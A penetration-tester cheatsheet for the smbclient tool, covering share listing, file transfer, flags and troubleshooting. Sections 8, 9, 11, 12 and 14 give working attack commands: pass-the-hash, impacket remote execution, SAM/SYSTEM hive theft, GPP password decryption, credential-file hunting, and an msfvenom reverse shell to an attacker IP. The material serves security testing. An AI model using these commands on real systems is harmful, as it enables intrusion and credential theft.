# smbclient — Penetration Tester Cheatsheet

> **Tool:** smbclient (Samba suite) | **Ports:** 139/TCP, 445/TCP | **OS:** Linux / Kali

---

## 1. Installation

```bash
apt install smbclient       # Debian / Ubuntu / Kali
smbclient --version         # check version
```

---

## 2. Basic Syntax

```bash
smbclient //<target>/<share> [OPTIONS] #connect to share
smbclient -L //<target> [OPTIONS]      # list shares
```

---

## 3. Listing Shares

```bash
# Null session (anonymous)
smbclient -L //<target> -N
smbclient -L //<target> -U ''%''
smbclient //<target>/IPC$ -N

# Guest session
smbclient -L //<target> -U guest%

# With credentials
smbclient -L //<target> -U <user>%<pass>
smbclient -L //<target> -U <domain>/<user>%<pass>

# Pass-the-Hash
smbclient -L //<target> -U <user>%<NTLM_hash> --pw-nt-hash

# Custom port / debug
smbclient -L //<target> -N -p 4445
smbclient -L //<target> -N -d 3        # -d 0-10, 3 = verbose
```

---

## 4. Connecting to a Share

```bash
# Anonymous / null session
smbclient //<target>/<share> -N

# With credentials
smbclient //<target>/<share> -U <user>%<pass>

# With domain
smbclient //<target>/<share> -U <domain>\\<user>%<pass>

# Pass-the-Hash
smbclient //<target>/<share> -U <user>%<NTLM_hash> --pw-nt-hash

# Kerberos (requires valid TGT)
kinit <user>@<DOMAIN.COM>
smbclient //<target>/<share> -k

# Force SMBv1 (legacy / EternalBlue targets)
smbclient //<target>/<share> -U <user>%<pass> \
  --option='client min protocol=NT1'

# Force SMBv2 / SMBv3
smbclient //<target>/<share> -U <user>%<pass> \
  --option='client min protocol=SMB2'

# Custom port / workgroup
smbclient //<target>/<share> -U <user>%<pass> -p 4445
smbclient //<target>/<share> -U <user>%<pass> -W <workgroup>
```

---

## 5. Interactive Session Commands

### Navigation

```
ls                   list files and directories
ls *.txt             list with wildcard
cd <dir>             change remote directory
cd ..                go up one level
pwd                  print current remote directory
lcd <local_dir>      change local directory
```

### File Transfer

```
get <file>                download a file
get <file> <local>        download and rename locally
put <file>                upload a file
put <local> <remote>      upload and rename remotely
mget *                    download all (use with prompt OFF)
mput *                    upload all (use with prompt OFF)
```

### Bulk Download (Recursive)

```
recurse ON           enable recursive directory traversal
prompt OFF           disable confirmation prompts
mget *               download everything recursively
```

### File Management

```
del <file>           delete a remote file
mkdir <dir>          create a remote directory
rmdir <dir>          remove a remote directory
rename <old> <new>   rename a remote file
allinfo <file>       show file metadata / timestamps
du                   disk usage
volume               show share volume info
!<cmd>               run a local shell command (e.g. !ls /tmp)
exit / quit / q      exit smbclient
help                 list all available commands
```

---

## 6. Non-Interactive One-Liners (`-c` flag)

```bash
# List directory
smbclient //<target>/<share> -U <user>%<pass> -c 'ls'

# Download specific file
smbclient //<target>/<share> -U <user>%<pass> -c 'get secret.txt'

# Download to specific local path
smbclient //<target>/<share> -U <user>%<pass> \
  -c 'get secret.txt /tmp/secret.txt'

# Upload a file
smbclient //<target>/<share> -U <user>%<pass> -c 'put shell.exe'

# Chain multiple commands
smbclient //<target>/<share> -U <user>%<pass> \
  -c 'cd docs; ls; get report.pdf'

# Recursive download — one-liner
smbclient //<target>/<share> -U <user>%<pass> \
  -c 'recurse ON; prompt OFF; mget *'

# Create a directory
smbclient //<target>/<share> -U <user>%<pass> -c 'mkdir loot'
```

---

## 7. Recursive Download (All Files)

```bash
# Method 1 — interactive session
smbclient //<target>/<share> -U <user>%<pass>
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Method 2 — one-liner
smbclient //<target>/<share> -U <user>%<pass> \
  -c 'recurse ON; prompt OFF; mget *'

# Method 3 — smbget (alternative tool)
smbget -R smb://<target>/<share> -U <user>%<pass>
smbget -R smb://<target>/<share> -a          # anonymous
```

---

## 8. Pass-the-Hash (PtH)

```bash
# List shares
smbclient -L //<target> -U <user>%<NTLM_hash> --pw-nt-hash

# Connect to share
smbclient //<target>/<share> -U <user>%<NTLM_hash> --pw-nt-hash

# Impacket alternatives for RCE
impacket-psexec <domain>/<user>@<target> -hashes :<NTLM_hash>
impacket-smbexec <domain>/<user>@<target> -hashes :<NTLM_hash>
impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM_hash>
```

---

## 9. Common Attack Scenarios

### Null / Guest Session Check

```bash
smbclient -L //<target> -N
smbclient //<target>/IPC$ -N
smbclient //<target>/<share> -U ''%''
smbclient //<target>/<share> -U guest%
```

### SYSVOL — Hunt for GPP Passwords

```bash
smbclient //<DC_IP>/SYSVOL -U <user>%<pass>
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Find Groups.xml then decrypt cpassword:
gpp-decrypt <cpassword_value>
```

### Dump SAM / SYSTEM Hives (Offline Cracking)

```bash
smbclient //<target>/C$ -U Administrator%<pass> \
  -c 'get Windows\System32\config\SAM /tmp/SAM'

smbclient //<target>/C$ -U Administrator%<pass> \
  -c 'get Windows\System32\config\SYSTEM /tmp/SYSTEM'

# Crack offline with impacket
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
```

### Upload Reverse Shell

```bash
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<attacker_IP> LPORT=4444 -f exe -o shell.exe

# Upload via smbclient
smbclient //<target>/<share> -U <user>%<pass> \
  -c 'put shell.exe shell.exe'
```

### Search for Specific File Extensions

```bash
# Inside interactive session (with recurse ON)
smb: \> recurse ON
smb: \> ls *.xml
smb: \> ls *.ps1
smb: \> ls *.config
smb: \> ls *.txt
smb: \> ls *.kdbx
```

---

## 10. All Flags / Options

|Flag|Description|
|---|---|
|`-L //<target>`|List available shares|
|`-N`|No password (null / anonymous session)|
|`-U <user>%<pass>`|Username and password|
|`-W <workgroup>`|Specify workgroup or domain|
|`-p <port>`|Specify port (default 445)|
|`-c '<cmd>'`|Run command non-interactively|
|`--pw-nt-hash`|Treat password as NTLM hash (PtH)|
|`-k`|Use Kerberos authentication|
|`-d <level>`|Debug level 0–10 (3 = verbose)|
|`-I <IP>`|Force IP address (bypass DNS)|
|`-m <protocol>`|Max protocol: NT1, SMB2, SMB3|
|`--option='...'`|Pass smb.conf options inline|
|`-s <smb.conf>`|Use alternate smb.conf file|
|`-t <timeout>`|Timeout in seconds|

---

## 11. Common Share Names to Target

|Share|Description|Notes|
|---|---|---|
|`C$`|Admin share — full C: drive|Requires local admin|
|`ADMIN$`|Windows system directory|Requires local admin|
|`IPC$`|Inter-process communication|Null session often works|
|`SYSVOL`|Domain GPO files|Hunt for `Groups.xml` → GPP passwords|
|`NETLOGON`|Domain logon scripts|Check for hardcoded creds|
|`print$`|Printer drivers|Check if writable|
|`Users` / `homes`|User home directories|SSH keys, docs, browser history|
|`Backups` / `Backup`|Backup archives|Often misconfigured / readable|
|`IT` / `Files` / `Share`|Custom org shares|Check permissions|

---

## 12. Interesting Files to Hunt

```
# Credentials & configuration
unattend.xml
sysprep.xml / sysprep.inf
Groups.xml                ← GPP passwords (SYSVOL) → gpp-decrypt
web.config
appsettings.json
.env
php.ini
wp-config.php

# Registry hives (offline hash cracking)
Windows\System32\config\SAM
Windows\System32\config\SYSTEM
Windows\System32\config\SECURITY

# SSH keys & certificates
id_rsa, *.pem, *.pfx, *.p12, *.key, *.cer
authorized_keys

# Scripts with hardcoded credentials
*.bat, *.ps1, *.vbs, *.cmd, *.sh
deploy.sh, setup.ps1, backup.bat

# Password managers
*.kdbx                    ← KeePass database
passwords.txt, creds.txt, logins.txt

# Database files
*.db, *.sqlite, *.mdb, *.sql, *.bak
```

---

## 13. Troubleshooting

|Error|Cause|Fix|
|---|---|---|
|`NT_STATUS_ACCESS_DENIED`|No permissions|Try `guest%''`, then `-N`, check share ACLs|
|`NT_STATUS_LOGON_FAILURE`|Wrong credentials|Try `domain\user`, `user@domain`, bare `user`|
|`NT_STATUS_BAD_NETWORK_NAME`|Share doesn't exist|Run `-L` to enumerate shares first|
|`NT_STATUS_CONNECTION_REFUSED`|Service not running|Check port 445 with nmap|
|Protocol mismatch|Legacy SMBv1 host|Add `--option='client min protocol=NT1'`|
|Slow / timeout|Network issue|Add `-t 30` (timeout seconds)|

```bash
# Increase verbosity for debugging
smbclient //<target>/<share> -U <user>%<pass> -d 3
```

---

## 14. Quick Tips

|Tip|Detail|
|---|---|
|**Check SMB signing**|`netexec smb <subnet>/24 --gen-relay-list targets.txt` — signing must be disabled for NTLM relay|
|**Password policy before spraying**|`enum4linux -P <target>` or `netexec smb <target> -u '' -p '' --pass-pol` — avoid lockouts|
|**SYSVOL is always worth checking**|`Groups.xml` → `cpassword` field → `gpp-decrypt`|
|**Recurse for extension search**|`recurse ON` then `ls *.xml` finds files in all subdirectories|
|**Force IP to bypass DNS**|`-I <IP>` when DNS resolution fails|
|**Combine with secretsdump**|Grab SAM+SYSTEM then crack offline with `impacket-secretsdump LOCAL`|
|**Always try null + guest**|Many orgs leave IPC$ or read shares open to unauthenticated users|

---

